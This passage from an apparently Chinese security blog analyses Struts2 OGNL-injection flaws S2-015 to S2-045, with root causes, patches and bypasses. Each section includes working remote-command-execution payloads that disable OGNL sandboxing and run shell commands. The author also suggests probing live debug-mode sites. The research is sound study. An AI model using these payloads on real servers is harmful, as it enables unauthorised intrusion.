</code></pre></div> <h4 id=_8>修复</h4> <p><img alt=image-20200514152500049 src=/images/talk_about_struts2/image-20200514152500049.png></p> <p><img alt=image-20200514152517255 src=/images/talk_about_struts2/image-20200514152517255.png></p> <p>这里<code>org.apache.struts2.views.util.DefaultUrlHelper</code>不再使用TextParseUtil来处理</p> <h3 id=9-s2-015>9. S2-015</h3> <p>影响范围：Struts 2.0.0 - Struts 2.3.14.2</p> <p>S2-015一共有两种：</p> <p>第一种漏洞原理跟S2-012类似，这次问题不是出在重定向，而是在解析具体的action name时出现的问题</p> <p><img alt=image-20200514165546294 src=/images/talk_about_struts2/image-20200514165546294.png></p> <p>这里的<code>{1}</code>会被替换成<code>xxx.action</code>的<code>xxx</code>，这里的<code>xxx</code>如果被我们替换成OGNL表达式，会在后续的<code>TextParseUtil.translateVariables</code>得到执行，过程跟S2-012一样，不再叙述。</p> <p>第二种是结果由httpheader来处理时，会将我们的<code>${message}</code>嵌套执行</p> <p><img alt=image-20200514202040764 src=/images/talk_about_struts2/image-20200514202040764.png></p> <p><code>org.apache.struts2.dispatcher.HttpHeaderResult#execute</code></p> <p><img alt=image-20200514202919865 src=/images/talk_about_struts2/image-20200514202919865.png></p> <p>跟S2-012一样，解析执行<code>${另一层以%起始的OGNL表达式}</code></p> <h4 id=poc_8>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a>// 摘自https://www.freebuf.com/vuls/217482.html
<a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action
<a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a>// 第二种
<a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a>？message=%{#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ifconfig&#39;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()}
</code></pre></div> <p>这里比较特殊的是这里对原有<code>#_memberAccess['allowStaticMethodAccess']=true</code>，改成了</p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=c1>// 原来的方式</span><span class=w></span>
<a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a><span class=err>#</span><span class=n>_memberAccess</span><span class=o>[</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>true</span><span class=w></span>
<a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a>
<a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a><span class=c1>// 通过反射机制来设置#_memberAccess[&#39;allowStaticMethodAccess&#39;]</span><span class=w></span>
<a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a><span class=err>#</span><span class=n>m</span><span class=o>=</span><span class=err>#</span><span class=n>_memberAccess</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=p>),</span><span class=w></span>
<a id=__codelineno-16-6 name=__codelineno-16-6 href=#__codelineno-16-6></a><span class=err>#</span><span class=n>m</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>),</span><span class=w></span>
<a id=__codelineno-16-7 name=__codelineno-16-7 href=#__codelineno-16-7></a><span class=err>#</span><span class=n>m</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=p>,</span><span class=kc>true</span><span class=p>)</span><span class=w></span>
</code></pre></div> <p>为什么要通过这种方式来写入呢？</p> <p>先来看OGNL是怎么setValue的</p> <p><code>ognl.OgnlRuntime#setFieldValue</code></p> <p><img alt=image-20200514173311368 src=/images/talk_about_struts2/image-20200514173311368.png></p> <p>而此时这里我们要设置的<code>#_memberAccess['allowStaticMethodAccess']</code></p> <p><img alt=image-20200514173631503 src=/images/talk_about_struts2/image-20200514173631503.png></p> <p>是final类型，我们不能使用普通的方式改变他的值，只能通过上面的反射的方式来进行修改。</p> <p>这里的改变是从struts2 2.3.14.1版本开始的，意味着高于这个版本的以后的poc只能通过这种方式来设置</p> <p>除了上面通过反射机制来进行绕过，我们也可以直接用构造器的方法来执行，比如<code>new ProccessBuilder('id').start()</code></p> <h4 id=_9>修复</h4> <p>这里的修复就是S2-012的修复，主要修复了执行这种OGNL表达式<code>${另一层%起始的OGNL表达式}</code></p> <h3 id=10-s2-016>10. S2-016</h3> <p>范围：Struts 2.0.0 - Struts 2.3.15</p> <p>S2-016问题出在处理默认的<code>action:xxx</code>或<code>redirect:xxx</code>，后面跟的<code>xxx</code>为OGNL表达式，Struts2默认将用<code>ServletRedirectResult</code>来处理跳转问题，这里跟S2-012一样，只是这里的跳转设置在url里面</p> <p>执行链路跟S2-012一样，不作分析了</p> <h4 id=poc_9>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=nl>redirect</span><span class=p>:</span><span class=o>%</span><span class=p>{</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=p>.</span><span class=na>MethodAccessor</span><span class=p>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=p>,</span><span class=err>#</span><span class=n>m</span><span class=o>=</span><span class=err>#</span><span class=n>_memberAccess</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=p>),</span><span class=err>#</span><span class=n>m</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>),</span><span class=err>#</span><span class=n>m</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=p>,</span><span class=kc>true</span><span class=p>),</span><span class=err>#</span><span class=n>q</span><span class=o>=</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=p>(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>).</span><span class=na>getInputStream</span><span class=p>()),</span><span class=err>#</span><span class=n>writer</span><span class=o>=</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getWriter</span><span class=p>(),</span><span class=err>#</span><span class=n>writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=err>#</span><span class=n>q</span><span class=p>),</span><span class=err>#</span><span class=n>writer</span><span class=p>.</span><span class=na>flush</span><span class=p>(),</span><span class=err>#</span><span class=n>writer</span><span class=p>.</span><span class=na>close</span><span class=p>()}</span><span class=w></span>
</code></pre></div> <h4 id=_10>修复</h4> <p><code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper</code>默认的<code>redirect/redirectaction</code>直接被删除了</p> <p><img alt=image-20200515154730941 src=/images/talk_about_struts2/image-20200515154730941.png></p> <p><code>action:</code>部分因为S2-015的关系，限制了action名</p> <p><img alt=image-20200515154855569 src=/images/talk_about_struts2/image-20200515154855569.png></p> <p>已经不构成威胁了</p> <h3 id=11-s2-019>11. S2-019</h3> <p>范围：Struts 2.0.0 - Struts 2.3.15.1</p> <p>S2-019跟S2-008的第二个漏洞一样，当开启开发者模式时，允许使用command的模式来执行OGNL表达式</p> <p>具体看S2-008</p> <h4 id=poc_10>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a>?debug=command&amp;expression=(%23context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())
</code></pre></div> <h4 id=_11>修复</h4> <p>这里后面的几个版本都是允许执行的，开发者模式下的command并没有被取消掉，所以如果在线上环境碰到debug模式，那就可以尝试一下OGNL表达式的执行</p> <p>但是由于从struts2 2.3.20之后引入了黑名单模式（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），并且使用构造函数的方式也失效了</p> <p>这里前辈们用到了将SecurityMemberAccess初始化的方式来绕过这个限制，原理可以好好看看这篇文章https://paper.seebug.org/794/#33-struts-2329。</p> <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=n>debug</span><span class=o>=</span><span class=n>command</span><span class=o>&amp;</span><span class=n>expression</span><span class=o>=</span><span class=p>((</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>).(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>open</span><span class=o>+/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>&#39;</span><span class=p>)))</span><span class=w></span>
</code></pre></div> <p>后续还有一些绕过，后面再讲</p> <h3 id=12-s2-029s2-036>12. S2-029/S2-036</h3> <p>S2-029影响范围：Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p> <p>S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要在修复的地方讲）</p> <p>原理跟S2-001差不多，S2-029的触发需要jsp用到标签<code>&lt;s:textfield name="%{xxxx}"&gt;&lt;/s:textfield&gt;</code>，name属性中由一OGNL表达式解析而得，意味着生成的input标签的name属性是动态计算而得的，比如?xxxx=username，此时解析得到的input.name为username。这其中执行了<code>%{xxxx}</code>，获得xxxx的内容。而S2-001的修复主要解决的是递归计算OGNL表达式的问题，S2-029就是在进入translateVariables之前就将第一层的OGNL表达式执行完毕</p> <p><img alt=image-20200519143433067 src=/images/talk_about_struts2/image-20200519143433067.png></p> <p>直接看<code>UIBean.evaluateParams</code></p> <p>首先计算<code>%{message}</code>到我们传入的OGNL表达式</p> <p><img alt=image-20200519144431546 src=/images/talk_about_struts2/image-20200519144431546.png></p> <p>后续会在我们传入的OGNL表达式括上<code>%{xxx}</code></p> <p><img alt=image-20200519144525695 src=/images/talk_about_struts2/image-20200519144525695.png></p> <p><img alt=image-20200519144603429 src=/images/talk_about_struts2/image-20200519144603429.png></p> <p>此时再传入到<code>findValue</code>就是第二层的OGNL表达式，后续跟S2-001一样，只需要执行一次OGNL表达式计算即可</p> <h4 id=poc_11>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a><span class=c1>// 需要先初始化SecurityMemberAccess，不然无法执行</span><span class=w></span>
<a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a><span class=o>?</span><span class=n>message</span><span class=o>=</span><span class=p>((</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>).(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>open</span><span class=o>+/</span><span class=n>System</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>Calculator</span><span class=p>.</span><span class=na>app</span><span class=err>&#39;</span><span class=p>)))</span><span class=w></span>
<a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a><span class=c1>// 回显POC</span><span class=w></span>
<a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a><span class=o>?</span><span class=n>message</span><span class=o>=</span><span class=p>(</span><span class=o>%</span><span class=mi>23_</span><span class=n>memberAccess</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>,</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>)),</span><span class=o>%</span><span class=mi>23</span><span class=n>q</span><span class=o>=</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=p>(</span><span class=o>%</span><span class=mi>23</span><span class=n>ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>())</span><span class=w></span>
<a id=__codelineno-20-5 name=__codelineno-20-5 href=#__codelineno-20-5></a><span class=w> </span><span class=c1>// S2-036</span><span class=w></span>
<a id=__codelineno-20-6 name=__codelineno-20-6 href=#__codelineno-20-6></a><span class=w> </span><span class=p>((</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>).(</span><span class=err>#</span><span class=n>ret</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>))).(</span><span class=err>#</span><span class=n>q</span><span class=o>=</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=p>(</span><span class=err>#</span><span class=n>ret</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()))</span><span class=w></span>
</code></pre></div> <h3 id=s2-029>修复S2-029</h3> <p><code>com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute</code></p> <p><img alt=image-20200519152941105 src=/images/talk_about_struts2/image-20200519152941105.png></p> <p>在计算表达式之前，验证是否可以执行</p> <p><img alt=image-20200519153530702 src=/images/talk_about_struts2/image-20200519153530702.png></p> <p><img alt=image-20200519153555655 src=/images/talk_about_struts2/image-20200519153555655.png></p> <p>这里先看<code>node.isEvalChain</code>，这里是对S2-009做的限制，也就是当出现<code>((1)(2))</code>时，会解析出<code>ASTEval</code>节点，而<code>ASTEval</code>对象的<code>isEvalChain</code>函数直接返回true，也就使得<code>(1)(2)</code>无法执行</p> <p>其次再来看<code>node.isSequence</code>，这里是对形如<code>(xxx1,xxx2,xxx3)</code>的OGNL表达式的限制，他将解析出<code>ASTSequence</code>节点，<code>ASTSequence</code>对象的<code>isSequence</code>直接返回true，也就限制了这种表达式的执行</p> <p>然后比较有意思的是，对于形如<code>((xxx1).(xxx2).(xxx3))</code>的OGNL表达式，这是一种<code>ASTChain</code>，但其中并不会解析出<code>ASTEval</code></p> <p>看前面的分析，知道可以将S2-029的修复bypass掉，也就是S2-036的问题</p> <h3 id=13-s2-032s2-033s2-037>13. S2-032/S2-033/S2-037</h3> <p>影响范围：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p> <p>这里我的环境搭的是rest-showcase的，所以主要讲S2-033（S2-032的原理跟他差不多，只是触发变成了<code>method:#_xxxx</code>)</p> <p>rest-plugin支持解析<code>xxx!method</code>的调用</p> <p><code>org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation</code>解析<code>name!method</code>，并对当前的<code>restactionmapper</code>设置好后续要调用method</p> <p><img alt=image-20200520223124404 src=/images/talk_about_struts2/image-20200520223124404.png></p> <p>在struts2的所有intercepter调用完毕后，会去调用DefaultActionInvocation的invokeActionOnly函数</p> <p><img alt=image-20200520223603177 src=/images/talk_about_struts2/image-20200520223603177.png></p> <p>而invokeActionOnly会去调用<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code></p> <p><img alt=image-20200520223738228 src=/images/talk_about_struts2/image-20200520223738228.png></p> <p>在这个函数里，我们可以看到他将前面可控的methodName放进了<code>ognlUtil.getValue</code>，导致了OGNL表达式的执行</p> <p>需要注意的是，在前面调用的interceptor里不能出现异常的情况，会导致无法执行到OGNL表达式执行的位置。这也就是为什么不能在开启<code>devMode</code>的情况下进行利用的原因。</p> <h4 id=poc_12>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a><span class=nl>http</span><span class=p>:</span><span class=c1>//localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig</span><span class=w></span>
<a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>
<a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a><span class=c1>// S2-037</span><span class=w></span>
<a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a><span class=nl>http</span><span class=p>:</span><span class=c1>//localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span><span class=w></span>
</code></pre></div> <p>这里我们执行的命令用<code>#parameters.command[0]</code>的方式来获取，这是因为在生成<code>DefaultActionProxy</code>的时候对methodName做了转义处理，为了避免转义破坏OGNL表达式，用<code>#parameters</code>的方式从参数中获取。</p> <p>还有一个需要注意的地方是，在最后调用<code>ognlUtil.getValue</code>时，在methodName后面拼接了<code>()</code>，我们需要将这个<code>()</code>做处理，比如这里的POC做的处理是<code>#xx.toString</code>去吃掉这个<code>()</code></p> <h4 id=s2-032s2-033>S2-032/S2-033修复</h4> <p><img alt=image-20200520230704180 src=/images/talk_about_struts2/image-20200520230704180.png></p> <p><code>xwork-core:2.3.28.1</code>在<code>OgnlUtil.isEvalExpression</code>增加了<code>isSequence</code>的判断</p> <p>这里出现了新的一种利用方式<code>(1)?(2):(3)</code>，这种形式的OGNL表达式将有<code>ASTTest</code>对象来处理</p> <p>而<code>isEvalChain()</code>和<code>isSequence()</code>限制的是<code>ASTEval</code>和<code>ASTSequence</code>对象，这里并没有对ASTTest做限制，并且由于<code>isSequence</code>并不是递归去判断的，所以在<code>ASTTest</code>的children节点上再出现<code>ASTSequence</code>也是ok的</p> <p>根据这个原理，我们可以写出新的POC</p> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>)</span><span class=o>?</span><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=err>#</span><span class=n>parameters</span><span class=p>.</span><span class=na>command</span><span class=o>[</span><span class=mi>0</span><span class=o>]</span><span class=p>),</span><span class=err>#</span><span class=n>ros</span><span class=o>=</span><span class=p>(</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getOutputStream</span><span class=p>()),</span><span class=nd>@org.apache.commons.io.IOUtils@copy</span><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=err>#</span><span class=n>ros</span><span class=p>),</span><span class=err>#</span><span class=n>ros</span><span class=p>.</span><span class=na>flush</span><span class=p>()):</span><span class=n>d</span><span class=p>.</span><span class=na>json</span><span class=w></span>
</code></pre></div> <h4 id=s2-037>S2-037修复</h4> <p><img alt=image-20200520233839824 src=/images/talk_about_struts2/image-20200520233839824.png></p> <p>在解析<code>name!method</code>的地方，调用了<code>cleanupActionName</code></p> <p><img alt=image-20200520233957407 src=/images/talk_about_struts2/image-20200520233957407.png></p> <p>使用了正则，防止出现<code>(#@)</code>等特殊字符，出现就报错，也就到不了后续的OGNL表达式的执行</p> <p>并且在禁止的class列表里增加了两个</p> <p><img alt=image-20200520234647887 src=/images/talk_about_struts2/image-20200520234647887.png></p> <p>使得我们不能在用<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>来绕过限制</p> <h4 id=_12>一个有意思的地方</h4> <p>前面说到这3个漏洞需要开启DynamicMethodInvocation，其实不开启也是可以的</p> <p>前面说的几种方法都是在处理<code>name!method</code>这个格式，rest其实还支持对<code>action/id/method</code>的解析</p> <p><img alt=image-20200521112254951 src=/images/talk_about_struts2/image-20200521112254951.png></p> <p>所以改改POC就能通杀rest-plugin了</p> <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=nl>http</span><span class=p>:</span><span class=c1>//localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span><span class=w></span>
</code></pre></div> <h2 id=14-s2-045s2-046>14. S2-045/S2-046</h2> <p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p> <p>S2-046原理一样，这里只分析S2-045</p> <p>这里2.3和2.5版本变化比较大，这里以2.3.31的代码分析，看2.5的可以看https://paper.seebug.org/247/</p> <p>从struts2的工作流程图来看，所有的请求在生成ActionProxy之前，都由FilterDispatcher来处理，2.3版本用的是<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>，这里在调用action之前会先封装request。</p> <p>看看调用栈</p> <p><img alt=image-20200521154143972 src=/images/talk_about_struts2/image-20200521154143972.png></p> <p>封装实际由<code>org.apache.struts2.dispatcher.Dispatcher#wrapRequest</code>处理</p> <p><img alt=image-20200521154319856 src=/images/talk_about_struts2/image-20200521154319856.png></p> <p>可以看到这里在处理<code>Content-Type: multipart/form-data</code>类型时，会生成<code>org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper</code>处理，S2-045就是出问题在这里</p> <p><img alt=image-20200521154524558 src=/images/talk_about_struts2/image-20200521154524558.png></p> <p>在用<code>JakartaMultiPartRequest</code>解析request包时，调用<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code>来检查Content-Type的内容，需要由multipart/开头才行，不然就是报错并将具体的contentType内容写到异常里</p> <p><img alt=image-20200521155036903 src=/images/talk_about_struts2/image-20200521155036903.png></p> <p>这里我们的可控数据就到了异常上，就看struts2是怎么处理异常了</p> <p><code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse</code></p> <p><img alt=image-20200521155309089 src=/images/talk_about_struts2/image-20200521155309089.png></p> <p><img alt=image-20200521155346720 src=/images/talk_about_struts2/image-20200521155346720.png></p> <p>可控内容传入了<code>com.opensymphony.xwork2.util.LocalizedTextUtil#findText</code></p> <p><img alt=image-20200521155451100 src=/images/talk_about_struts2/image-20200521155451100.png></p> <p><img alt=image-20200521155901705 src=/images/talk_about_struts2/image-20200521155901705.png></p> <p>当前都没生成错误信息时，将获取默认的message</p> <p><img alt=image-20200521155825583 src=/images/talk_about_struts2/image-20200521155825583.png></p> <p>这里到了我们熟悉的<code>TextParseUtil.translateVariables</code>函数，他后续会处理计算OGNL表达式</p> <p>简单来说，整个过程从报错开始存入OGNL表达式，再生成错误信息的时候计算了OGNL表达式</p> <p>到了这里执行可控的OGNL表达式是第一步，因为2.3.29增加了对<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>的限制</p> <p>需要一种新的思路来绕过，S2-045的POC就给我们提供这样一个思路</p> <h4 id=poc_13>POC</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a><span class=o>%</span><span class=p>{</span><span class=w></span>
<a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a><span class=p>(</span><span class=err>#</span><span class=n>_</span><span class=o>=</span><span class=err>&#39;</span><span class=n>multipart</span><span class=o>/</span><span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=err>&#39;</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a><span class=p>(</span><span class=err>#</span><span class=n>dm</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>?</span><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=err>#</span><span class=n>dm</span><span class=p>):</span><span class=w></span>
<a id=__codelineno-24-5 name=__codelineno-24-5 href=#__codelineno-24-5></a><span class=w>        </span><span class=p>(</span><span class=w></span>
<a id=__codelineno-24-6 name=__codelineno-24-6 href=#__codelineno-24-6></a><span class=w>        </span><span class=p>(</span><span class=err>#</span><span class=n>container</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=p>.</span><span class=na>opensymphony</span><span class=p>.</span><span class=na>xwork2</span><span class=p>.</span><span class=na>ActionContext</span><span class=p>.</span><span class=na>container</span><span class=err>&#39;</span><span class=o>]</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-24-7 name=__codelineno-24-7 href=#__codelineno-24-7></a><span class=w>        </span><span class=p>(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>=</span><span class=err>#</span><span class=n>container</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-24-8 name=__codelineno-24-8 href=#__codelineno-24-8></a><span class=w>        </span><span class=p>(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=p>.</span><span class=na>getExcludedPackageNames</span><span class=p>().</span><span class=na>clear</span><span class=p>()).</span><span class=w></span>
<a id=__codelineno-24-9 name=__codelineno-24-9 href=#__codelineno-24-9></a><span class=w>        </span><span class=p>(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=p>.</span><span class=na>getExcludedClasses</span><span class=p>().</span><span class=na>clear</span><span class=p>()).</span><span class=w></span>
<a id=__codelineno-24-10 name=__codelineno-24-10 href=#__codelineno-24-10></a><span class=w>        </span><span class=p>(</span><span class=err>#</span><span class=n>context</span><span class=p>.</span><span class=na>setMemberAccess</span><span class=p>(</span><span class=err>#</span><span class=n>dm</span><span class=p>)))).</span><span class=w></span>
<a id=__codelineno-24-11 name=__codelineno-24-11 href=#__codelineno-24-11></a><span class=p>(</span><span class=err>#</span><span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-24-12 name=__codelineno-24-12 href=#__codelineno-24-12></a><span class=p>(</span><span class=err>#</span><span class=n>iswin</span><span class=o>=</span><span class=p>(</span><span class=nd>@java.lang.System@getProperty</span><span class=p>(</span><span class=err>&#39;</span><span class=n>os</span><span class=p>.</span><span class=na>name</span><span class=err>&#39;</span><span class=p>).</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>contains</span><span class=p>(</span><span class=err>&#39;</span><span class=n>win</span><span class=err>&#39;</span><span class=p>))).</span><span class=w></span>
